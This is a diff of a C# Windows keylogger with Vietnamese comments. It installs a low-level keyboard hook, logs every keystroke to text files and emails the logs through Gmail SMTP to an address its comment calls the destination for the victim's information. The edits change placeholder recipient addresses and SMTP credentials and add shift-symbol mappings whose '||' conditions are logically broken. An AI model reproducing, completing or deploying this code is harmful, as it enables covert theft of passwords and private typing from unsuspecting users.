@@ -17,7 +17,6 @@ namespace Windows_Application
 {
     class Program
     {
-        
         #region Nhận biết các phím đã nhấn xuống.
         private const int WH_KEYBOARD_LL = 13; // mã nhả phím lên
         private const int WM_KEYDOWN = 0x0100; // mã nhấn phím xuống
@@ -25,13 +24,13 @@ namespace Windows_Application
         private static LowLevelKeyboardProc _proc = HookCallback; // Tạo ra một hàm Hookcallback - Deligate
         private static IntPtr _hookID = IntPtr.Zero; //định danh từng keys - handle
 
-        private static string logName = "Log_";       
+        private static string logName = "Log_";
         private static string logExtendtion = ".txt";
 
 
 
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]  
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook,
             LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
@@ -113,6 +112,21 @@ namespace Windows_Application
             StreamWriter sw = new StreamWriter(logNameToWrite, true);
 
             if (vkCode == 8) key = "[Back]";
+
+            //Kí tự đặc biệt
+
+            else if (vkCode == 48 || vkCode == 161) key = ")";
+            else if (vkCode == 49 || vkCode == 161) key = "!";
+            else if (vkCode == 50 || vkCode == 161) key = "@";
+            else if (vkCode == 51 || vkCode == 161) key = "#";
+            else if (vkCode == 52 || vkCode == 161) key = "$";
+            else if (vkCode == 53 || vkCode == 161) key = "%";
+            else if (vkCode == 54 || vkCode == 161) key = "^";
+            else if (vkCode == 55 || vkCode == 161) key = "&";
+            else if (vkCode == 56 || vkCode == 161) key = "*";
+
+
+
             else if (vkCode == 9) key = "\r"; //[Tab]
             else if (vkCode == 13) key = "\n"; //[Enter]
             else if (vkCode == 19) key = "[Pause]";
@@ -198,8 +212,8 @@ namespace Windows_Application
             else if (vkCode == 123) key = "[F12]";
             else if (vkCode == 144) key = "[Num Lock]";
             else if (vkCode == 145) key = "[Scroll Lock]";
-            else if (vkCode == 160) key = "[Left-Shift]"; 
-            else if (vkCode == 161) key = "[Right-Shift]";
+           /* else if (vkCode == 160) key = "[Left-Shift]";
+            else if (vkCode == 161) key = "[Right-Shift]";*/
             else if (vkCode == 162) key = "[Ctrl]";
             else if (vkCode == 163) key = "[Ctrl]";
             else if (vkCode == 164) key = "[Alt]";
@@ -220,19 +234,7 @@ namespace Windows_Application
             else if (vkCode == 226) key = "\\";
 
 
-            //Kí tự đặc biệt
-/*
-            else if (vkCode == 48 && vkCode == 161 ) key = ")";
-            else if (vkCode == 49 && vkCode == 161 ) key = "!";
-            else if (vkCode == 50 && vkCode == 161 ) key = "@";
-            else if (vkCode == 51 && vkCode == 161 ) key = "#";
-            else if (vkCode == 52 && vkCode == 161 ) key = "$";
-            else if (vkCode == 53 && vkCode == 161 ) key = "%";
-            else if (vkCode == 54 && vkCode == 161 ) key = "^";
-            else if (vkCode == 55 && vkCode == 161 ) key = "&";
-            else if (vkCode == 56 && vkCode == 161 ) key = "*";
-            else if (vkCode == 57 && vkCode == 161 ) key = "(";*/
-
+      
 
             else key = "[" + vkCode + "]";
 
@@ -391,7 +393,7 @@ namespace Windows_Application
                 SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com"); // Client dùng để gửi mail 
 
                 mail.From = new MailAddress("email@gmail.com");
-                mail.To.Add("email@gmail.com"); //Mail mà thông tin của victim được gửi về 
+                mail.To.Add("youremail@gmail.com"); //Mail mà thông tin của victim được gửi về 
                 // Chỉnh sửa lại "email" để phù hợp 
                 mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
                 mail.Body = "Nội dung của victim\n" + "\n";
@@ -417,7 +419,7 @@ namespace Windows_Application
                 }
 
                 SmtpServer.Port = 587;
-                SmtpServer.Credentials = new System.Net.NetworkCredential("user@gmail.com", "password");// Tài khoản và mật khẩu của mình để gửi mail
+                SmtpServer.Credentials = new System.Net.NetworkCredential("youremail@gmail.com", "Password");// Tài khoản và mật khẩu của mình để gửi mail
                 SmtpServer.EnableSsl = true;
 
 
@@ -465,3 +467,4 @@ namespace Windows_Application
         }
     }
 }
+    
